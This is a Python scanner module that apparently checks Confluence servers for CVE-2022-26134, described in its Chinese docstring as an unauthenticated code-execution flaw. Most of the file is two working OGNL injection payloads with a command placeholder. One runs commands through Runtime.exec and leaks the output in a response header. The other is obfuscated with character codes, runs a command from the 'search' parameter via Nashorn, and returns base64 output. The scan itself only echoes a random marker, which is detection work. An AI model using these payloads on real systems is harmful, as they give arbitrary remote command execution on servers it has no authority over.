#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5
from lib.tool import check
import base64

cve_2022_26134_payloads = [
    {'path': '%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{RCECOMMAND}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/'},
    {'path': '%24%7BClass.forName%28%22com.opensymphony.webwork.ServletActionContext%22%29.getMethod%28%22getResponse%22%2Cnull%29.invoke%28null%2Cnull%29.setHeader%28%22X-Confluence%22%2CClass.forName%28%22javax.script.ScriptEngineManager%22%29.newInstance%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22eval%28String.fromCharCode%28118%2C97%2C114%2C32%2C114%2C101%2C113%2C61%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C99%2C111%2C109%2C46%2C111%2C112%2C101%2C110%2C115%2C121%2C109%2C112%2C104%2C111%2C110%2C121%2C46%2C119%2C101%2C98%2C119%2C111%2C114%2C107%2C46%2C83%2C101%2C114%2C118%2C108%2C101%2C116%2C65%2C99%2C116%2C105%2C111%2C110%2C67%2C111%2C110%2C116%2C101%2C120%2C116%2C46%2C103%2C101%2C116%2C82%2C101%2C113%2C117%2C101%2C115%2C116%2C40%2C41%2C59%2C13%2C10%2C118%2C97%2C114%2C32%2C99%2C109%2C100%2C61%2C114%2C101%2C113%2C46%2C103%2C101%2C116%2C80%2C97%2C114%2C97%2C109%2C101%2C116%2C101%2C114%2C40%2C34%2C115%2C101%2C97%2C114%2C99%2C104%2C34%2C41%2C59%2C13%2C10%2C118%2C97%2C114%2C32%2C114%2C117%2C110%2C116%2C105%2C109%2C101%2C61%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C106%2C97%2C118%2C97%2C46%2C108%2C97%2C110%2C103%2C46%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C46%2C103%2C101%2C116%2C82%2C117%2C110%2C116%2C105%2C109%2C101%2C40%2C41%2C59%2C13%2C10%2C118%2C97%2C114%2C32%2C101%2C110%2C99%2C111%2C100%2C101%2C114%2C61%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C106%2C97%2C118%2C97%2C46%2C117%2C116%2C105%2C108%2C46%2C66%2C97%2C115%2C101%2C54%2C52%2C46%2C103%2C101%2C116%2C69%2C110%2C99%2C111%2C100%2C101%2C114%2C40%2C41%2C59%2C13%2C10%2C101%2C110%2C99%2C111%2C100%2C101%2C114%2C46%2C101%2C110%2C99%2C111%2C100%2C101%2C84%2C111%2C83%2C116%2C114%2C105%2C110%2C103%2C40%2C110%2C101%2C119%2C32%2C80%2C97%2C99%2C107%2C97%2C103%2C101%2C115%2C46%2C106%2C97%2C118%2C97%2C46%2C117%2C116%2C105%2C108%2C46%2C83%2C99%2C97%2C110%2C110%2C101%2C114%2C40%2C114%2C117%2C110%2C116%2C105%2C109%2C101%2C46%2C101%2C120%2C101%2C99%2C40%2C99%2C109%2C100%2C41%2C46%2C103%2C101%2C116%2C73%2C110%2C112%2C117%2C116%2C83%2C116%2C114%2C101%2C97%2C109%2C40%2C41%2C41%2C46%2C117%2C115%2C101%2C68%2C101%2C108%2C105%2C109%2C105%2C116%2C101%2C114%2C40%2C34%2C92%2C92%2C65%2C34%2C41%2C46%2C110%2C101%2C120%2C116%2C40%2C41%2C46%2C103%2C101%2C116%2C66%2C121%2C116%2C101%2C115%2C40%2C41%2C41%29%29%22%29%29%7D/?search={RCECOMMAND}'}
]

def cve_2022_26134_scan(self, clients):
    ''' 2022年6月2日Atlassian官方发布了一则安全更新, 通告了一个严重且已在野利用的代码执行漏洞, 
        攻击者利用这个漏洞即可无需任何条件在Confluence中执行任意命令
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'RCE',
        'vul_id': 'CVE-2022-26134',
    }
    
    headers = {
        'Referer': client.protocol_domain
    }

    for payload in cve_2022_26134_payloads:
        random_str = random_md5(6)
        RCEcommand = 'echo%20' + random_str
        
        path = payload['path'].format(RCECOMMAND=RCEcommand)

        res = client.request(
            'get',
            path,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        x_cmd_response = res.headers.get('X-Cmd-Response', '')
        x_confluence = base64.b64decode(res.headers.get('X-Confluence', '')).decode()

        if (check.check_res(x_cmd_response, random_str)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
        elif (check.check_res(x_confluence, random_str)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Response-Headers': 'X-Confluence: XXX',
                'Response-Decode': 'Base64',
                'Request': res
            }
            return results
    return None
